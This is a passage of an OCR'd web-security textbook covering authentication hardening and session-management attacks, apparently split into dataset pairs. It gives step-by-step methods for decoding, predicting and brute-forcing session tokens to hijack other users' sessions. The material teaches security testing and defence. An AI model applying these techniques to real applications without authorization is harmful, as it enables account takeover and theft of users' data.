recov-\nery URL. This e-mail should be sent to the address that the user provided\nduring registration. Visiting the URL allows the user to set a new pass-\nword. After this has been done, a second e-mail should be sent, indicating\nthat a password change was made. To prevent an attacker from denying\nservice to users by continually requesting password reactivation e-mails,\nthe user’s existing credentials should remain valid until they are changed.\nn To further protect against unauthorized access, applications may present\nusers with a secondary challenge that they must complete before gain-\ning access to the password reset function. Be sure that the design of this\nchallenge does not introduce new vulnerabilities:\nn The challenge should implement the same question or set of ques-\ntions for everyone, mandated by the application during registration.\nIf users provide their own challenge, it is likely that some of these will\nbe weak, and this also enables an attacker to enumerate valid accounts\nby identifying those that have a challenge set.\nn Responses to the challenge should contain suffi cient entropy that they\ncannot be easily guessed. For example, asking the user for the name of\nhis fi rst school is preferable to asking for his favorite color.\nn Accounts should be temporarily suspended following a number of\nfailed attempts to complete the challenge, to prevent brute-force attacks.\nn The application should not leak any information in the event of failed\nresponses to the challenge — regarding the validity of the username,\nany suspension of the account, and so on.\nn Successful completion of the challenge should be followed by the\nprocess described previously, in which a message is sent to the user’s\nregistered e-mail address containing a reactivation URL. Under no\ncircumstances should the application disclose the user’s forgotten\npassword or simply drop the user into an authenticated session. Even\nproceeding directly to the password reset function is undesirable. The\nresponse to the account recovery challenge will in general be easier\nfor an attacker to guess than the original password, so it should not\nbe relied upon on its own to authenticate the user.\ncc0066..iinndddd 220000 88//1199//22001111 1122::0066::4422 PPMM"
  },
  {
    "input": "Summary",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 201\nChapter 6 n Attacking Authentication 201\nLog, Monitor, and Notify\nn The application should log all authentication-related events, including\nlogin, logout, password change, password reset, account suspension, and\naccount recovery. Where applicable, both failed and successful attempts\nshould be logged. The logs should contain all relevant details (such as\nusername and IP address) but no security secrets (such as passwords).\nLogs should be strongly protected from unauthorized access, because\nthey are a critical source of information leakage.\nn Anomalies in authentication events should be processed by the appli-\ncation’s real-time alerting and intrusion prevention functionality. For\nexample, application administrators should be made aware of patterns\nindicating brute-force attacks so that appropriate defensive and offensive\nmeasures can be considered.\nn Users should be notifi ed out-of-band of any critical security events. For\nexample, the application should send a message to a user’s registered\ne-mail address whenever he changes his password.\nn Users should be notifi ed in-band of frequently occurring security events.\nFor example, after a successful login, the application should inform users of\nthe time and source IP/domain of the last login and the number of invalid\nlogin attempts made since then. If a user is made aware that her account\nis being subjected to a password-guessing attack, she is more likely to\nchange her password frequently and set it to a strong value.\nSummary\nAuthentication functions are perhaps the most prominent target in a typical\napplication’s attack surface. By defi nition, they can be reached by unprivileged,\nanonymous users. If broken, they grant access to protected functionality\nand sensitive data. They lie at the core of the security mechanisms that an\napplication employs to defend itself and are the front line of defense against\nunauthorized access.\nReal-world authentication mechanisms contain a myriad of design and imple-\nmentation fl aws. An effective assault against them needs to proceed systemati-\ncally, using a structured methodology to work through every possible avenue of\nattack. In many cases, open goals present themselves — bad passwords, ways to\nfi nd out usernames, vulnerability to brute-force attacks. At the other end of the\nspectrum, defects may be very hard to uncover. They may require meticulous\nexamination of a convoluted login process to establish the assumptions being\ncc0066..iinndddd 220011 88//1199//22001111 1122::0066::4422 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 202\n202 Chapter 6 n Attacking Authentication\nmade and to help you spot the subtle logic fl aw that can be exploited to walk\nright through the door.\nThe most important lesson when attacking authentication functionality is to\nlook everywhere. In addition to the main login form, there may be functions to\nregister new accounts, change passwords, remember passwords, recover forgotten\npasswords, and impersonate other users. Each of these presents a rich target of\npotential defects, and problems that have been consciously eliminated within\none function often reemerge within others. Invest the time to scrutinize and\nprobe every inch of attack surface you can fi nd, and your rewards may be great.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. While testing a web application, you log in using your credentials of joe\nandpass. During the login process, you see a request for the following\nURL appear in your intercepting proxy:\nhttp://www.wahh-app.com/app?action=login&uname=joe&password=pass\nWhat three vulnerabilities can you diagnose without probing any further?\n2. How can self-registration functions introduce username enumeration\nvulnerabilities? How can these vulnerabilities be prevented?\n3. A login mechanism involves the following steps:\n(a) The application requests the user’s username and passcode.\n(b) The application requests two randomly chosen letters from the user’s\nmemorable word.\nWhy is the required information requested in two separate steps? What\ndefect would the mechanism contain if this were not the case?\n4. A multistage login mechanism fi rst requests the user’s username and\nthen various other items across successive stages. If any supplied item is\ninvalid, the user is immediately returned to the fi rst stage.\nWhat is wrong with this mechanism, and how can the vulnerability be\ncorrected?\n5. An application incorporates an antiphishing mechanism into its login\nfunctionality. During registration, each user selects a specifi c image from\na large bank of memorable images that the application presents to her.\nThe login function involves the following steps:\n(a) The user enters her username and date of birth.\ncc0066..iinndddd 220022 88//1199//22001111 1122::0066::4422 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 203\nChapter 6 n Attacking Authentication 203\n(b) If these details are correct, the application shows the user her chosen\nimage; otherwise, a random image is displayed.\n(c) The user verifi es whether the correct image is displayed. If it is, she\nenters her password.\nThe idea behind this antiphishing mechanism is that it enables the user\nto confi rm that she is dealing with the authentic application, not a clone,\nbecause only the real application knows the correct image to display to\nthe user.\nWhat vulnerability does this antiphishing mechanism introduce into the\nlogin function? Is the mechanism effective at preventing phishing?\ncc0066..iinndddd 220033 88//1199//22001111 1122::0066::4422 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 204\ncc0066..iinndddd 220044 88//1199//22001111 1122::0066::4422 PPMM"
  },
  {
    "input": "Chapter 7 Attacking Session Management",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 205\nCHAPTER\n7\nAttacking Session Management\nThe session management mechanism is a fundamental security component in\nthe majority of web applications. It is what enables the application to uniquely\nidentify a given user across a number of different requests and to handle\nthe data that it accumulates about the state of that user’s interaction with the\napplication. Where an application implements login functionality, session man-\nagement is of particular importance, because it is what enables the application\nto persist its assurance of any given user’s identity beyond the request in which\nhe supplies his credentials.\nBecause of the key role played by session management mechanisms, they\nare a prime target for malicious attacks against the application. If an attacker\ncan break an application’s session management, she can effectively bypass its\nauthentication controls and masquerade as other application users without\nknowing their credentials. If an attacker compromises an administrative user\nin this way, the attacker can own the entire application.\nAs with authentication mechanisms, a wide variety of defects can commonly\nbe found in session management functions. In the most vulnerable cases, an\nattacker simply needs to increment the value of a token issued to him by the\napplication to switch his context to that of a different user. In this situation,\nthe application is wide open for anyone to access all areas. At the other end\nof the spectrum, an attacker may have to work extremely hard, deciphering\nseveral layers of obfuscation and devising a sophisticated automated attack,\nbefore fi nding a chink in the application’s armor.\n205\ncc0077..iinndddd 220055 88//1199//22001111 1122::0077::3388 PPMM"
  },
  {
    "input": "The Need for State",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 206\n206 Chapter 7 n Attacking Session Management\nThis chapter looks at all the types of weakness the authors have encountered\nin real-world web applications. It sets out in detail the practical steps you need\nto take to fi nd and exploit these defects. Finally, it describes the defensive mea-\nsures that applications should take to protect themselves against these attacks.\nCOMMON MYTH\n“We use smartcards for authentication, and users’ sessions cannot be com-\npromised without them.”\nHowever robust an application’s authentication mechanism, subsequent\nrequests from users are only linked back to that authentication via the result-\ning session. If the application’s session management is fl awed, an attacker\ncan bypass the robust authentication and still compromise users.\nThe Need for State\nThe HTTP protocol is essentially stateless. It is based on a simple request-response\nmodel, in which each pair of messages represents an independent transaction.\nThe protocol itself contains no mechanism for linking the series of requests\nmade by a particular user and distinguishing these from all the other requests\nreceived by the web server. In the early days of the Web, there was no need for\nany such mechanism: websites were used to publish static HTML pages for\nanyone to view. Today, things are very different.\nThe majority of web “sites” are in fact web applications. They allow you to\nregister and log in. They let you buy and sell goods. They remember your pref-\nerences the next time you visit. They deliver rich multimedia experiences with\ncontent created dynamically based on what you click and type. To implement\nany of this functionality, web applications need to use the concept of a session.\nThe most obvious use of sessions is in applications that support logging in.\nAfter entering your username and password, you can use the application as\nthe user whose credentials you have entered, until you log out or the session\nexpires due to inactivity. Without a session, a user would have to reenter his\npassword on every page of the application. Hence, after authenticating the user\nonce, the application creates a session for him and treats all requests belonging\nto that session as coming from that user.\nApplications that do not have a login function also typically need to use ses-\nsions. Many sites selling merchandise do not require customers to create accounts.\nHowever, they allow users to browse the catalog, add items to a shopping basket,\nprovide delivery details, and make a payment. In this scenario, there is no need\nto authenticate the user’s identity: for the majority of his visit, the application\ndoes not know or care who the user is. But to do business with him, it needs to\nknow which series of requests it receives originated from the same user.\ncc0077..iinndddd 220066 88//1199//22001111 1122::0077::3388 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 207\nChapter 7 n Attacking Session Management 207\nThe simplest and still most common means of implementing sessions is to\nissue each user a unique session token or identifi er. On each subsequent request\nto the application, the user resubmits this token, enabling the application to\ndetermine which sequence of earlier requests the current request relates to.\nIn most cases, applications use HTTP cookies as the transmission mechanism\nfor passing these session tokens between server and client. The server’s fi rst\nresponse to a new client contains an HTTP header like the following:\nSet-Cookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55\nand subsequent requests from the client contain this header:\nCookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55\nThis standard session management mechanism is inherently vulnerable to\nvarious categories of attack. An attacker’s primary objective in targeting the\nmechanism is to somehow hijack the session of a legitimate user and thereby\nmasquerade as that person. If the user has been authenticated to the application,\nthe attacker may be able to access private data belonging to the user or carry\nout unauthorized actions on that person’s behalf. If the user is unauthenticated,\nthe attacker may still be able to view sensitive information submitted by the\nuser during her session.\nAs in the previous example of a Microsoft IIS server running ASP.NET, most\ncommercial web servers and web application platforms implement their own\noff-the-shelf session management solution based on HTTP cookies. They provide\nAPIs that web application developers can use to integrate their own session-\ndependent functionality with this solution.\nSome off-the-shelf implementations of session management have been found to\nbe vulnerable to various attacks, which results in users’ sessions being compro-\nmised (these are discussed later in this chapter). In addition, some developers fi nd\nthat they need more fi ne-grained control over session behavior than is provided\nfor them by the built-in solutions, or they want to avoid some vulnerabilities\ninherent in cookie-based solutions. For these reasons, it is fairly common to see\nbespoke and/or non-cookie-based session management mechanisms used in\nsecurity-critical applications such as online banking.\nThe vulnerabilities that exist in session management mechanisms largely\nfall into two categories:\nn Weaknesses in the generation of session tokens\nn Weaknesses in the handling of session tokens throughout their life cycle\nWe will look at each of these areas in turn, describing the different types of\ndefects that are commonly found in real-world session management mecha-\nnisms, and practical techniques for discovering and exploiting these. Finally,\nwe will describe measures that applications can take to defend themselves\nagainst these attacks.\ncc0077..iinndddd 220077 88//1199//22001111 1122::0077::3388 PPMM"
  },
  {
    "input": "Alternatives to Sessions",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 208\n208 Chapter 7 n Attacking Session Management\nHACK STEPS\nIn many applications that use the standard cookie mechanism to transmit\nsession tokens, it is straightforward to identify which item of data contains\nthe token. However, in other cases this may require some detective work.\n1. The application may often employ several different items of data col-\nlectively as a token, including cookies, URL parameters, and hidden form\nfields. Some of these items may be used to maintain session state on dif-\nferent back-end components. Do not assume that a particular parameter\nis the session token without proving it, or that sessions are being tracked\nusing only one item.\n2. Sometimes, items that appear to be the application’s session token may\nnot be. In particular, the standard session cookie generated by the web\nserver or application platform may be present but not actually used by the\napplication.\n3. Observe which new items are passed to the browser after authentication.\nOften, new session tokens are created after a user authenticates herself.\n4. To verify which items are actually being employed as tokens, find a page\nthat is definitely session-dependent (such as a user-specific “my details”\npage). Make several requests for it, systematically removing each item\nthat you suspect is being used as a token. If removing an item causes\nthe session-dependent page not to be returned, this may confirm that the\nitem is a session token. Burp Repeater is a useful tool for performing\nthese tests.\nAlternatives to Sessions\nNot every web application employs sessions, and some security-critical applica-\ntions containing authentication mechanisms and complex functionality opt to\nuse other techniques to manage state. You are likely to encounter two possible\nalternatives:\nn HTTP authentication — Applications using the various HTTP-based\nauthentication technologies (basic, digest, NTLM) sometimes avoid the\nneed to use sessions. With HTTP authentication, the client component\ninteracts with the authentication mechanism directly via the browser,\nusing HTTP headers, and not via application-specifi c code contained\nwithin any individual page. After the user enters his credentials into a\nbrowser dialog, the browser effectively resubmits these credentials (or\nreperforms any required handshake) with every subsequent request to\nthe same server. This is equivalent to an application that uses HTML\nforms-based authentication and places a login form on every application\npage, requiring users to reauthenticate themselves with every action they\nperform. Hence, when HTTP-based authentication is used, it is possible\ncc0077..iinndddd 220088 88//1199//22001111 1122::0077::3388 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 209\nChapter 7 n Attacking Session Management 209\nfor an application to reidentify the user across multiple requests without\nusing sessions. However, HTTP authentication is rarely used on Internet-\nbased applications of any complexity, and the other versatile benefi ts\nthat fully fl edged session mechanisms offer mean that virtually all web\napplications do in fact employ these mechanisms.\nn Sessionless state mechanisms — Some applications do not issue session\ntokens to manage the state of a user’s interaction with the application.\nInstead, they transmit all data required to manage that state via the client,\nusually in a cookie or a hidden form fi eld. In effect, this mechanism uses\nsessionless state much like the ASP.NET ViewState does. For this type\nof mechanism to be secure, the data transmitted via the client must be\nproperly protected. This usually involves constructing a binary blob\ncontaining all the state information and encrypting or signing this using\na recognized algorithm. Suffi cient context must be included within the\ndata to prevent an attacker from collecting a state object at one location\nwithin the application and submitting it to another location to cause some\nundesirable behavior. The application may also include an expiration time\nwithin the object’s data to perform the equivalent of session timeouts.\nChapter 5 describes in more detail secure mechanisms for transmitting\ndata via the client.\nHACK STEPS\n1. If HTTP authentication is being used, it is possible that no session manage-\nment mechanism is implemented. Use the methods described previously to\nexamine the role played by any token-like items of data.\n2. If the application uses a sessionless state mechanism, transmitting all\ndata required to maintain state via the client, this may sometimes be\ndifficult to detect with certainty, but the following are strong indicators\nthat this kind of mechanism is being used:\nn Token-like data items issued to the client are fairly long (100 or more bytes).\nn The application issues a new token-like item in response to every request.\nn The data in the item appears to be encrypted (and therefore has no\ndiscernible structure) or signed (and therefore has a meaningful structure\naccompanied by a few bytes of meaningless binary data).\nn The application may reject attempts to submit the same item with more\nthan one request.\n3. If the evidence suggests strongly that the application is not using session\ntokens to manage state, it is unlikely that any of the attacks described in\nthis chapter will achieve anything. Your time probably would be better\nspent looking for other serious issues such as broken access controls or\ncode injection.\ncc0077..iinndddd 220099 88//1199//22001111 1122::0077::3399 PPMM"
  },
  {
    "input": "Meaningful Tokens",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 210\n210 Chapter 7 n Attacking Session Management\nWeaknesses in Token Generation\nSession management mechanisms are often vulnerable to attack because tokens\nare generated in an unsafe manner that enables an attacker to identify the values\nof tokens that have been issued to other users.\nNOTE There are numerous locations where an application’s security\ndepends on the unpredictability of tokens it generates. Here are some\nexamples:\nn Password recovery tokens sent to the user’s registered e-mail address\nn Tokens placed in hidden form fi elds to prevent cross-site request forgery\nattacks (see Chapter 13)\nn Tokens used to give one-time access to protected resources\nn Persistent tokens used in “remember me” functions\nn Tokens allowing customers of a shopping application that does not use\nauthentication to retrieve the current status of an existing order\nThe considerations in this chapter relating to weaknesses in token generation\napply to all these cases. In fact, because many of today’s applications rely on\nmature platform mechanisms to generate session tokens, it is often in these\nother areas of functionality that exploitable weaknesses in token generation\nare found.\nMeaningful Tokens\nSome session tokens are created using a transformation of the user’s username\nor e-mail address, or other information associated with that person. This infor-\nmation may be encoded or obfuscated in some way and may be combined with\nother data.\nFor example, the following token may initially appear to be a long random\nstring:\n757365723d6461663b6170703d61646d696e3b646174653d30312f31322f3131\nHowever, on closer inspection, you can see that it contains only hexadecimal\ncharacters. Guessing that the string may actually be a hex encoding of a string\nof ASCII characters, you can run it through a decoder to reveal the following:\nuser=daf;app=admin;date=10/09/11\ncc0077..iinndddd 221100 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 211\nChapter 7 n Attacking Session Management 211\nAttackers can exploit the meaning within this session token to attempt to\nguess the current sessions of other application users. Using a list of enumerated\nor common usernames, they can quickly generate large numbers of potentially\nvalid tokens and test these to confi rm which are valid.\nTokens that contain meaningful data often exhibit a structure. In other words,\nthey contain several components, often separated by a delimiter, that can be\nextracted and analyzed separately to allow an attacker to understand their\nfunction and means of generation. Here are some components that may be\nencountered within structured tokens:\nn The account username\nn The numeric identifi er that the application uses to distinguish between\naccounts\nn The user’s fi rst and last names\nn The user’s e-mail address\nn The user’s group or role within the application\nn A date/time stamp\nn An incrementing or predictable number\nn The client IP address\nEach different component within a structured token, or indeed the entire\ntoken, may be encoded in different ways. This can be a deliberate measure to\nobfuscate their content, or it can simply ensure safe transport of binary data via\nHTTP. Encoding schemes that are commonly encountered include XOR, Base64,\nand hexadecimal representation using ASCII characters (see Chapter 3). It may\nbe necessary to test various decodings on each component of a structured token\nto unpack it to its original form.\nNOTE When an application handles a request containing a structured token,\nit may not actually process every component with the token or all the data\ncontained in each component. In the previous example, the application may\nBase64-decode the token and then process only the “user” and “date” com-\nponents. In cases where a token contains a blob of binary data, much of this\ndata may be padding. Only a small part of it may actually be relevant to the\nvalidation that the server performs on the token. Narrowing down the sub-\nparts of a token that are actually required can often considerably reduce the\namount of apparent entropy and complexity that the token contains.\ncc0077..iinndddd 221111 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 212\n212 Chapter 7 n Attacking Session Management\nHACK STEPS\n1. Obtain a single token from the application, and modify it in systematic\nways to determine whether the entire token is validated or whether some\nof its subcomponents are ignored. Try changing the token’s value one\nbyte at a time (or even one bit at a time) and resubmitting the modified\ntoken to the application to determine whether it is still accepted. If you\nfind that certain portions of the token are not actually required to be cor-\nrect, you can exclude these from any further analysis, potentially reducing\nthe amount of work you need to perform. You can use the “char frobber”\npayload type in Burp Intruder to modify a token’s value in one character\nposition at a time, to help with this task.\n2. Log in as several different users at different times, and record the tokens\nreceived from the server. If self-registration is available and you can choose\nyour username, log in with a series of similar usernames containing small\nvariations between them, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA,\nand so on. If other user-specific data is submitted at login or stored in user\nprofiles (such as an e-mail address), perform a similar exercise to vary that\ndata systematically, and record the tokens received following login.\n3. Analyze the tokens for any correlations that appear to be related to the\nusername and other user-controllable data.\n4. Analyze the tokens for any detectable encoding or obfuscation. Where the\nusername contains a sequence of the same character, look for a correspond-\ning character sequence in the token, which may indicate the use of XOR\nobfuscation. Look for sequences in the token containing only hexadecimal\ncharacters, which may indicate a hex encoding of an ASCII string or other\ninformation. Look for sequences that end in an equals sign and/or that con-\ntain only the other valid Base64 characters: a to z, A to Z, 0 to 9, +, and /.\n5. If any meaning can be reverse-engineered from the sample of session\ntokens, consider whether you have sufficient information to attempt to\nguess the tokens recently issued to other application users. Find a page\nof the application that is session-dependent, such as one that returns an\nerror message or a redirect elsewhere if accessed without a valid session.\nThen use a tool such as Burp Intruder to make large numbers of requests\nto this page using guessed tokens. Monitor the results for any cases in\nwhich the page is loaded correctly, indicating a valid session token.\nTRY IT!\nhttp://mdsec.net/auth/321/\nhttp://mdsec.net/auth/329/\nhttp://mdsec.net/auth/331/\ncc0077..iinndddd 221122 88//1199//22001111 1122::0077::3399 PPMM"
  },
  {
    "input": "Predictable Tokens",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 213\nChapter 7 n Attacking Session Management 213\nPredictable Tokens\nSome session tokens do not contain any meaningful data associating them\nwith a particular user. Nevertheless, they can be guessed because they contain\nsequences or patterns that allow an attacker to extrapolate from a sample of\ntokens to fi nd other valid tokens recently issued by the application. Even if the\nextrapolation involves some trial and error (for example, one valid guess per\n1,000 attempts), this would still enable an automated attack to identify large\nnumbers of valid tokens in a relatively short period of time.\nVulnerabilities relating to predictable token generation may be much easier to\ndiscover in commercial implementations of session management, such as web\nservers or web application platforms, than they are in bespoke applications.\nWhen you are remotely targeting a bespoke session management mechanism,\nyour sample of issued tokens may be restricted by the server’s capacity, the\nactivity of other users, your bandwidth, network latency, and so on. In a labora-\ntory environment, however, you can quickly create millions of sample tokens,\nall precisely sequenced and time-stamped, and you can eliminate interference\ncaused by other users.\nIn the simplest and most brazenly vulnerable cases, an application may use\na simple sequential number as the session token. In this case, you only need\nto obtain a sample of two or three tokens before launching an attack that will\nquickly capture 100% of currently valid sessions.\nFigure 7-1 shows Burp Intruder being used to cycle the last two digits of a\nsequential session token to fi nd values where the session is still active and can\nbe hijacked. Here, the length of the server’s response is a reliable indicator that\na valid session has been found. The extract grep feature has also been used to\nshow the name of the logged-in user for each session.\nIn other cases, an application’s tokens may contain more elaborate sequences\nthat take some effort to discover. The types of potential variations you might\nencounter here are open-ended, but the authors’ experience in the fi eld indicates\nthat predictable session tokens commonly arise from three different sources:\nn Concealed sequences\nn Time dependency\nn Weak random number generation\nWe will look at each of these areas in turn.\nConcealed Sequences\nIt is common to encounter session tokens that cannot be easily predicted when\nanalyzed in their raw form but that contain sequences that reveal themselves\nwhen the tokens are suitably decoded or unpacked.\ncc0077..iinndddd 221133 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 214\n214 Chapter 7 n Attacking Session Management\nFigure 7-1: An attack to discover valid sessions where the session token is\npredictable\nConsider the following series of values, which form one component of a\nstructured session token:\nlwjVJA\nLs3Ajg\nxpKr+A\nXleXYg\n9hyCzA\njeFuNg\nJaZZoA\nNo immediate pattern is discernible; however, a cursory inspection indicates\nthat the tokens may contain Base64-encoded data. In addition to the mixed-case\nalphabetic and numeric characters, there is a + character, which is also valid in\na Base64-encoded string. Running the tokens through a Base64 decoder reveals\nthe following:\n--Õ$\n.ÍÀŽ\nÆ’«ø\n^W-b\nö‚Ì\n?án6\n%¦Y\ncc0077..iinndddd 221144 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 215\nChapter 7 n Attacking Session Management 215\nThese strings appear to be gibberish and also contain nonprinting characters. This\nnormally indicates that you are dealing with binary data rather than ASCII text.\nRendering the decoded data as hexadecimal numbers gives you the following:\n9708D524\n2ECDC08E\nC692ABF8\n5E579762\nF61C82CC\n8DE16E36\n25A659A0\nThere is still no visible pattern. However, if you subtract each number from the\nprevious one, you arrive at the following:\nFF97C4EB6A\n97C4EB6A\nFF97C4EB6A\n97C4EB6A\nFF97C4EB6A\nFF97C4EB6A\nwhich immediately reveals the concealed pattern. The algorithm used to generate\ntokens adds 0x97C4EB6A to the previous value, truncates the result to a 32-bit\nnumber, and Base64-encodes this binary data to allow it to be transported using\nthe text-based protocol HTTP. Using this knowledge, you can easily write a\nscript to produce the series of tokens that the server will next produce, and the\nseries that it produced prior to the captured sample.\nTime Dependency\nSome web servers and applications employ algorithms to generate session tokens\nthat use the time of generation as an input to the token’s value. If insuffi cient\nother entropy is incorporated into the algorithm, you may be able to predict\nother users’ tokens. Although any given sequence of tokens on its own may\nappear to be random, the same sequence coupled with information about the\ntime at which each token was generated may contain a discernible pattern. In a\nbusy application with a large number of sessions being created each second, a\nscripted attack may succeed in identifying large numbers of other users’ tokens.\nWhen testing the web application of an online retailer, the authors encoun-\ntered the following sequence of session tokens:\n3124538-1172764258718\n3124539-1172764259062\n3124540-1172764259281\n3124541-1172764259734\n3124542-1172764260046\n3124543-1172764260156\ncc0077..iinndddd 221155 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 216\n216 Chapter 7 n Attacking Session Management\n3124544-1172764260296\n3124545-1172764260421\n3124546-1172764260812\n3124547-1172764260890\nEach token is clearly composed of two separate numeric components. The\nfi rst number follows a simple incrementing sequence and is easy to predict.\nThe second number increases by a varying amount each time. Calculating the\ndifferences between its value in each successive token reveals the following:\n344\n219\n453\n312\n110\n140\n125\n391\n78\nThe sequence does not appear to contain a reliably predictable pattern. However,\nit would clearly be possible to brute-force the relevant number range in an auto-\nmated attack to discover valid values in the sequence. Before attempting this\nattack, however, we wait a few minutes and gather a further sequence of tokens:\n3124553-1172764800468\n3124554-1172764800609\n3124555-1172764801109\n3124556-1172764801406\n3124557-1172764801703\n3124558-1172764802125\n3124559-1172764802500\n3124560-1172764802656\n3124561-1172764803125\n3124562-1172764803562\nComparing this second sequence of tokens with the fi rst, two points are imme-\ndiately obvious:\nn The fi rst numeric sequence continues to progress incrementally; however,\nfi ve values have been skipped since the end of the fi rst sequence. This is\npresumably because the missing values have been issued to other users\nwho logged in to the application in the window between the two tests.\nn The second numeric sequence continues to progress by similar intervals\nas before; however, the fi rst value we obtain is a massive 539,578 greater\nthan the previous value.\ncc0077..iinndddd 221166 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 217\nChapter 7 n Attacking Session Management 217\nThis second observation immediately alerts us to the role played by time\nin generating session tokens. Apparently, only fi ve tokens have been issued\nbetween the two token-grabbing exercises. However, a period of approximately\n10 minutes has elapsed. The most likely explanation is that the second number\nis time-dependent and is probably a simple count of milliseconds.\nIndeed, our hunch is correct. In a subsequent phase of our testing we perform\na code review, which reveals the following token-generation algorithm:\nString sessId = Integer.toString(s_SessionIndex++) +\n“-” +\nSystem.currentTimeMillis();\nGiven our analysis of how tokens are created, it is straightforward to con-\nstruct a scripted attack to harvest the session tokens that the application issues\nto other users:\nn We continue polling the server to obtain new session tokens in quick\nsuccession.\nn We monitor the increments in the fi rst number. When this increases by\nmore than 1, we know that a token has been issued to another user.\nn When a token has been issued to another user, we know the upper and\nlower bounds of the second number that was issued to that person, because\nwe possess the tokens that were issued immediately before and after\nhis. Because we are obtaining new session tokens frequently, the range\nbetween these bounds will typically consist of only a few hundred values.\nn Each time a token is issued to another user, we launch a brute-force attack\nto iterate through each number in the range, appending this to the miss-\ning incremental number that we know was issued to the other user. We\nattempt to access a protected page using each token we construct, until\nthe attempt succeeds and we have compromised the user’s session.\nn Running this scripted attack continuously will enable us to capture the\nsession token of every other application user. When an administrative\nuser logs in, we will fully compromise the entire application.\nTRY IT!\nhttp://mdsec.net/auth/339/\nhttp://mdsec.net/auth/340/\nhttp://mdsec.net/auth/347/\nhttp://mdsec.net/auth/351/\ncc0077..iinndddd 221177 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 218\n218 Chapter 7 n Attacking Session Management\nWeak Random Number Generation\nVery little that occurs inside a computer is random. Therefore, when random-\nness is required for some purpose, software uses various techniques to generate\nnumbers in a pseudorandom manner. Some of the algorithms used produce\nsequences that appear to be stochastic and manifest an even spread across the\nrange of possible values. Nevertheless, they can be extrapolated forwards or\nbackwards with perfect accuracy by anyone who obtains a small sample of values.\nWhen a predictable pseudorandom number generator is used to produce\nsession tokens, the resulting tokens are vulnerable to sequencing by an attacker.\nJetty is a popular web server written in 100% Java that provides a session\nmanagement mechanism for use by applications running on it. In 2006, Chris\nAnley of NGSSoftware discovered that the mechanism was vulnerable to a\nsession token prediction attack. The server used the Java API java.util.Random\nto generate session tokens. This implements a “linear congruential generator,”\nwhich generates the next number in the sequence as follows:\nsynchronized protected int next(int bits) {\nseed = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);\nreturn (int)(seed >>> (48 - bits));\n}\nThis algorithm takes the last number generated, multiplies it by a constant,\nand adds another constant to obtain the next number. The number is truncated\nto 48 bits, and the algorithm shifts the result to return the specifi c number of\nbits requested by the caller.\nKnowing this algorithm and a single number generated by it, we can easily\nderive the sequence of numbers that the algorithm will generate next. With a\nlittle number theory, we also can derive the sequence that it generated previ-\nously. This means that an attacker who obtains a single session token from the\nserver can obtain the tokens of all current and future sessions.\nNOTE Sometimes when tokens are created based on the output of a pseu-\ndorandom number generator, developers decide to construct each token by\nconcatenating several sequential outputs from the generator. The perceived\nrationale for this is that it creates a longer, and therefore “stronger,” token.\nHowever, this tactic is usually a mistake. If an attacker can obtain several\nconsecutive outputs from the generator, this may enable him to infer some\ninformation about its internal state. In fact, it may be easier for the attacker to\nextrapolate the generator’s sequence of outputs, either forward or backward.\nOther off-the-shelf application frameworks use surprisingly simple or predict-\nable sources of entropy in session token generation, much of which is deterministic.\nFor example, in PHP frameworks 5.3.2 and earlier, the session token is generated\ncc0077..iinndddd 221188 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 219\nChapter 7 n Attacking Session Management 219\nbased on the client’s IP address, epoch time at token creation, microseconds at\ntoken creation, and a linear congruential generator. Although there are several\nunknown values here, some applications may disclose information that allows\nthem to be inferred. A social networking site may disclose the login time and\nIP address of site users. Additionally, the seed used in this generator is the time\nwhen the PHP process started, which could be determined to lie within a small\nrange of values if the attacker is monitoring the server.\nNOTE This is an evolving area of research. The weaknesses in PHP’s session\ntoken generation were pointed out on the Full Disclosure mailing list in 2001\nbut were not demonstrated to be actually exploitable. The 2001 theory was\nfi nally put into practice by Samy Kamkar with the phpwn tool in 2010.\nTesting the Quality of Randomness\nIn some cases, you can identify patterns in a series of tokens just from visual\ninspection, or from a modest amount of manual analysis. In general, however,\nyou need to use a more rigorous approach to testing the quality of randomness\nwithin an application’s tokens.\nThe standard approach to this task applies the principles of statistical hypoth-\nesis testing and employs various well-documented tests that look for evidence of\nnonrandomness within a sample of tokens. The high-level steps in this process\nare as follows:\n1. Start with the hypothesis that the tokens are randomly generated.\n2. Apply a series of tests, each of which observes specifi c properties of the\nsample that are likely to have certain characteristics if the tokens are\nrandomly generated.\n3. For each test, calculate the probability of the observed characteristics\noccurring, working on the assumption that the hypothesis is true.\n4. If this probability falls below a certain level (the “signifi cance level”), reject\nthe hypothesis and conclude that the tokens are not randomly generated.\nThe good news is you don’t have to do any of this manually! The best tool\nthat is currently available for testing the randomness of web application tokens\nis Burp Sequencer. This tool applies several standard tests in a fl exible way and\ngives you clear results that are easy to interpret.\nTo use Burp Sequencer, you need to fi nd a response from the application\nthat issues the token you want to test, such as a response to a login request that\nissues a new cookie containing a session token. Select the “send to sequencer”\noption from Burp’s context menu, and in the Sequencer confi guration, set the\nlocation of the token within the response, as shown in Figure 7-2. You can 